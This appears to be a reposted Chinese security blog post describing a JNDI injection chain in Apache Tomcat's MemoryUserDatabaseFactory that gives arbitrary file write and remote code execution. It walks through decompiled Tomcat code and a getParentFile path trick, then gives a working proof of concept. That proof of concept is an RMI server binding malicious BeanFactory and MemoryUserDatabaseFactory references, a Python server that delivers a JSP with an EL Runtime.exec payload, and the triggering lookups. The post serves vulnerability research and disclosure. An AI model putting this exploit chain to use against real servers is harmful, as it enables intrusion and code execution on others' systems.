#  通过 MemoryUserDatabaseFactory 中的路径操作进行 JNDI 注入远程代码执行   
 Ots安全   2024-07-27 16:39  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
在这篇博文中，我将描述一个相对较新向量通过我独立于其他研究人员发现的 JNDI 注入实现远程代码执行。利用对象查找过程进行 JNDI 注入的概念并不是什么新鲜事。如果您不熟悉这一点，我建议您阅读Michael Stepankin 撰写的这篇精彩博客文章。  
  
我决定取消《全栈 Web 攻击》中的一些内容，所以如果你喜欢这种级别的 Java（和/或 C#）分析。  
  
内存用户数据库工厂  
  
在探索实现的类型时，  
ObjectFactory我发现了一个有趣的类，叫做  
org.apache.catalina.users.MemoryUserDatabaseFactory。它位于  
tomcat-catalina库中，并且与包含（臭名昭著的）的库是同一个库   
org.apache.naming.factory.BeanFactory。这一点的重要性稍后会显现出来。  
  
让我们从 课堂  
getObjectInstance内部开始  
MemoryUserDatabaseFactory。  
```
/*     */   public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
/*     */     ...
/*  81 */     Reference ref = (Reference)obj;
/*     */     ...
/*  88 */     MemoryUserDatabase database = new MemoryUserDatabase(name.toString());
/*  89 */     RefAddr ra = null;
/*     */     
/*  91 */     ra = ref.get("pathname"); // 1
/*  92 */     if (ra != null) {
/*  93 */       database.setPathname(ra.getContent().toString());
/*     */     }
/*     */     
/*  96 */     ra = ref.get("readonly"); // 2
/*  97 */     if (ra != null) {
/*  98 */       database.setReadonly(Boolean.parseBoolean(ra.getContent().toString()));
/*     */     }
/*     */     ...
/* 107 */     database.open(); // 3
/*     */     
/* 109 */     if (!database.getReadonly()) // 6
/* 110 */       database.save(); // 7
/* 111 */     return database;
/*     */   }
```  
  
这里有一些有趣的代码，在[1]处我们可以看到攻击者可以控制实例  
pathname上的属性  
MemoryUserDatabase。  
  
在[2] 处，攻击者也可以禁用该  
readonly设置。但有趣的代码出现在[3] 处，其中调用了  
open数据库实例。让我们来看看：  
```
/*     */   public void open() {
/* 418 */     this.writeLock.lock();
/*     */     
/*     */     try {
/*     */       ...
/* 425 */       String pathName = getPathname(); // 4
/* 426 */       try (ConfigurationSource.Resource resource = ConfigFileLoader.getSource().getResource(pathName)) {
/*     */         ...
/* 430 */         digester = new Digester();
/*     */         try {
/* 432 */           digester.setFeature("http://apache.org/xml/features/allow-java-encodings", true);
/*     */         }
/* 434 */         catch (Exception e) {
/* 435 */           log.warn(sm.getString("memoryUserDatabase.xmlFeatureEncoding"), e);
/*     */         } 
/* 437 */         digester.addFactoryCreate("tomcat-users/group", new MemoryGroupCreationFactory(this), true);
/*     */         
/* 439 */         digester.addFactoryCreate("tomcat-users/role", new MemoryRoleCreationFactory(this), true);
/*     */         
/* 441 */         digester.addFactoryCreate("tomcat-users/user", new MemoryUserCreationFactory(this), true);
/*     */ 
/*     */ 
/*     */         
/* 445 */         digester.parse(resource.getInputStream()); // 5
/* 446 */       } catch (IOException ioe) {
/* 447 */         log.error(sm.getString("memoryUserDatabase.fileNotFound", new Object[] { pathName }));
/* 448 */       } catch (Exception e) {
/*     */         ...
/*     */       } 
/*     */     } finally {
/* 456 */       this.writeLock.unlock();
/*     */     } 
/*     */   }
```  
  
在[4]处，代码使用攻击者控制  
pathname从远程下载文件并在[5]处解析文件。这当然会导致外部实体注入（但我离题了！）。这里要强调的重点是攻击者可以使用 XML 文件中的属性设置  
users、  
groups或  
roles变量。这只是标准的  
tomcat-users.xml：  
```
<tomcat-users>
    <role rolename="admin" />
</tomcat-users>
```  
  
上述 XML 会将角色“admin”添加到实例  
roles内的 Map 中  
MemoryUserDatabase。回到，如果攻击者在[6]  
getObjectInstance处禁用只读，那么他们就可以到达[ 7]。  
save  
```
/*     */   public void save() { 
/*     */     ... 
/* 555 */     if (!isWriteable()) { // 8
/* 556 */       log.warn(sm.getString("memoryUserDatabase.notPersistable"));
/*     */       
/*     */       return;
/*     */     } 
/*     */     
/* 561 */     File fileNew = new File(this.pathnameNew); // 9
/* 562 */     if (!fileNew.isAbsolute()) {
/* 563 */       fileNew = new File(System.getProperty("catalina.base"), this.pathnameNew);
/*     */     }
/*     */     
/* 566 */     this.writeLock.lock();
/*     */     try {
/* 568 */       try(FileOutputStream fos = new FileOutputStream(fileNew); 
/* 569 */           OutputStreamWriter osw = new OutputStreamWriter(fos, StandardCharsets.UTF_8); 
/* 570 */           PrintWriter writer = new PrintWriter(osw)) {
/*     */ 
/*     */         
/* 573 */         writer.println("<?xml version='1.0' encoding='utf-8'?>");
/* 574 */         writer.println("<tomcat-users xmlns=\"http://tomcat.apache.org/xml\"");
/* 575 */         writer.print("              ");
/* 576 */         writer.println("xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"");
/* 577 */         writer.print("              ");
/* 578 */         writer.println("xsi:schemaLocation=\"http://tomcat.apache.org/xml tomcat-users.xsd\"");
/* 579 */         writer.println("              version=\"1.0\">");
/*     */ 
/*     */         
/* 582 */         values = null;
/* 583 */         values = getRoles();
/* 584 */         while (values.hasNext()) {
/* 585 */           writer.print("  ");
/* 586 */           writer.println(values.next()); // 10
/*     */         } 
/* 588 */         values = getGroups();
/* 589 */         while (values.hasNext()) {
/* 590 */           writer.print("  ");
/* 591 */           writer.println(values.next());
/*     */         } 
/* 593 */         values = getUsers();
/* 594 */         while (values.hasNext()) {
/* 595 */           writer.print("  ");
/* 596 */           writer.println(((MemoryUser)values.next()).toXml());
/*     */         } 
/*     */       ...
/* 607 */       } catch (IOException e) {
/*     */           ...
/*     */       } 
/* 613 */       this.lastModified = fileNew.lastModified();
/*     */     } finally {
/* 615 */       this.writeLock.unlock();
/*     */     } 
/*     */     ...
/* 626 */     File fileOrig = new File(this.pathname);
/*     */     ...
/* 636 */     if (!fileNew.renameTo(fileOrig)) { // 11
/* 637 */       if (fileOld.exists() && 
/* 638 */         !fileOld.renameTo(fileOrig)) {
/* 639 */         log.warn(sm.getString("memoryUserDatabase.restoreOrig", new Object[] { fileOld }));
/*     */       }
/*     */       
/* 642 */       throw new IOException(sm.getString("memoryUserDatabase.renameNew", new Object[] { fileOrig
/* 643 */               .getAbsolutePath() }));
/*     */     } 
/* 645 */     if (fileOld.exists() && !fileOld.delete()) {
/* 646 */       throw new IOException(sm.getString("memoryUserDatabase.fileDelete", new Object[] { fileOld }));
/*     */     }
/*     */   }
```  
  
在[8]处，代码调用  
isWriteable：  
```
/*     */   public boolean isWriteable() {
/* 532 */     File file = new File(this.pathname);
/* 533 */     if (!file.isAbsolute()) {
/* 534 */       file = new File(System.getProperty("catalina.base"), this.pathname);
/*     */     }
/* 536 */     File dir = file.getParentFile();
/* 537 */     return (dir.exists() && dir.isDirectory() && dir.canWrite());
/*     */   }
```  
  
如果提供的路径存在且是目录，并且最后是可写的，则此代码将返回true。  
http://attacker.tld/tomcat-users.xml但如果攻击者使用远程 URI（例如），他们将如何实现此目的：？  
  
让我们仔细看看  
getParentFile。运行以下代码……  
```
File file = new File("http://attacker.tld/../../tomcat-users.xml");
File dir = file.getParentFile();
System.out.println("getParentFile result: " + dir);
System.out.println("exists: " + dir.exists());
System.out.println("isDirectory: " + dir.isDirectory());
System.out.println("canWrite: " + dir.canWrite());
System.out.println("isAbsolute: " + file.isAbsolute());
```  
  
结果是：  
```
getParentFile result: http:/attacker.tld/../..
exists: false
isDirectory: false
canWrite: false
isAbsolute: false
```  
  
这里有趣的是，  
getParentFile转义 http 中的单斜杠 (/)，然后表示目录不存在。如果我们  
http:/attacker.tld在当前工作目录中创建目录，我们会得到：  
```
getParentFile result: http:/attacker.tld/../..
exists: true
isDirectory: true
canWrite: true
isAbsolute: false
```  
  
因此，如果攻击者拥有任意目录创建原语，那么他们就可以通过此检查！一旦攻击者通过了检查，他们就可以到达[9]，从而创建受控文件名，并.new在末尾添加扩展名。在[10]处，攻击者控制写入，在[11]处，文件被重命名为原始名称，并删除扩展名  
.new。  
  
由于攻击者有可能绕过  
isWriteable检查，他们可以利用这一点来实现任意文件写入，从而导致远程代码执行。  
  
绕过 isWriteable  
  
由于  
BeanFactory位于同一个库中，因此我们可以在 Java bean 上调用任何单个字符串参数方法。我在 Apache Velocity 库中找到了这样一个 bean 类，它允许创建任意目录：  
org.apache.velocity.texen.util.FileUtil  
```
/*    */ public class FileUtil
/*    */ {
/*    */   public static String mkdir(String s) {
/*    */     try {
/* 43 */       if ((new File(s)).mkdirs()) {
/* 44 */         return "Created dir: " + s;
/*    */       }
/* 46 */       return "Failed to create dir or dir already exists: " + s;
/*    */     }
/* 48 */     catch (Exception e) {
/*    */       
/* 50 */       return e.toString();
/*    */     } 
/*    */   }
```  
  
当然，攻击者可以使用任何其他方法来创建任意目录或可能包含类似 bean 的任何其他库。  
  
概念验证  
  
两个对象与 RMI 服务器绑定。第一个对象将创建所需的目录路径，第二个对象将路径引导到攻击者想要放置文件的位置。在实际攻击中，这些路径需要进行调整。  
```
package com.src.incite.jndi;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.StringRefAddr;
import org.apache.naming.ResourceRef;
import com.sun.jndi.rmi.registry.*;

public class ObjectFactoryServer {
    public static void main(String[] args) throws Exception {
        System.out.println("(+) creating RMI registry on port 1099");
        Registry registry = LocateRegistry.createRegistry(1099);
        // for folder creation
        ResourceRef ref1 = new ResourceRef("org.apache.velocity.texen.util.FileUtil", null, "", "", true, "org.apache.naming.factory.BeanFactory",null);
        ref1.add(new StringRefAddr("forceString", "x=mkdir"));
        ref1.add(new StringRefAddr("x", "http:/127.0.0.1:1337/"));

        // for a file write
        ResourceRef ref2 = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "", true, "org.apache.catalina.users.MemoryUserDatabaseFactory",null);
        ref2.add(new StringRefAddr("readonly", "false"));
        ref2.add(new StringRefAddr("pathname", "http://127.0.0.1:1337/../../../../some/path/to/apache-tomcat-9.0.65/webapps/ROOT/poc.jsp"));

        registry.bind("Dir", new ReferenceWrapper(ref1));
        registry.bind("Rce", new ReferenceWrapper(ref2));
    }
}
```  
  
但当然，攻击者会写些什么呢？事实证明，由于类中的 XML 节点解析，他们无法使用双引号或尖括号。如果攻击者要编写 JSP 文件，Digester他们当然可以使用表达式语言来规避该问题。  
```
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer

class el(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return
    def do_GET(self):
        if self.path.lower().strip().endswith('/poc.jsp'):
            print("(+) request recieved: %s" % self.path)
            message = """<tomcat-users>
    <role rolename="${Runtime.getRuntime().exec('gnome-calculator')}" />
</tomcat-users>"""
            self.send_response(200)
            self.end_headers()
            self.wfile.write(message.encode('utf-8'))
            self.wfile.write('\n'.encode('utf-8'))
        return

if __name__ == '__main__':
    HTTPServer(('0.0.0.0', 1337), el).serve_forever()
```  
  
对于存在漏洞的 JNDI 客户端，需要以下库（版本无关紧要）：  
- tomcat-catalina-9.0.24.jar  
  
- tomcat-juli-10.0.23.jar  
  
- tomcat-util-10.0.23.jar  
  
- tomcat-util-scan-10.0.23.jar  
  
- velocity-1.7.jar  
  
存在漏洞的应用程序需要进程所有者拥有可写的当前工作目录，攻击者还需要触发两次 JNDI 注入。攻击应该可以在基于 Windows 或 Unix 的系统上进行，因为  
getParentFile转义了正斜杠，并且在这两种情况下都可以从正斜杠构建路径。  
```
new InitialContext().lookup("rmi://127.0.0.1:1099/Dir");
new InitialContext().lookup("rmi://127.0.0.1:1099/Rce")
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafXkTqpH8kzeM2obWmRHzC0HPg8eYEicPgStFb99lQPkHhQPhGt3ic4uqSKaG5yokdacicea2L3EGqiag/640?wx_fmt=png&from=appmsg "")  
  
结论  
  
尽管看起来需要多个依赖项，但我相信我们可以通过找到其他目录创建向量或其他将攻击串联在一起的路径来减少这种情况。例如，如果您已经有一个任意目录创建原语，则可以删除 velocity 依赖项。此外，多个库往往会被分组、打包和部署在一起，因此，在您看到 tomcat catalina 库的地方，您肯定会找到 tomcat util 库。  
  
这为典型的  
BeanFactory+   
ELProcessor/  
GroovyShell组合提供了一个很好的替代方案，它可能在不可用时需要  
ELProcessor，  
GroovyShell但它确实需要在目标上下文中执行 JSP。  
  
参考  
  
https://github.com/veracode-research/rogue-jndi/  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
